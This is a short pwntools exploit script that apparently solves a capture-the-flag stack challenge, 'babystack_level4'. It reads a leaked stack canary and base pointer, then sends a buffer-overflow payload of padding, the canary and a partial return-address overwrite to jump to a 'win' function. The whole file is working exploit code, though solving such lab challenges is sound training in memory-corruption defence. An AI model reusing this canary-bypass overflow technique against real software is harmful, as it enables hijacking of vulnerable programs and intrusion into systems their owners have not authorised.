
from pwn import *


elf = ELF('/challenge/babystack_level4')
win_offset = elf.symbols['win']

r = process("/challenge/babystack_level4")

r.recvuntil(b"base pointer rbp: ")
bp = int(r.recvline(keepends=False), 16)
# print(bp)
r.sendline(hex(bp-8))

r.recvuntil(b"is: ")
canary = int(r.recvline(keepends=False), 16)

r.recvuntil(b"will be stored: ")
buf = int(r.recvline(keepends=False), 16)
# print(buf)
# padding=bp-buf+8
rip_saved=bp+8

padding1 = bp-8-buf

win_addr=rip_saved - 0x1710 + 0x1330

payload = b'a'*padding1 + p64(canary) + b'a'*8 + p16(0x1330)

r.send(payload)
r.interactive()

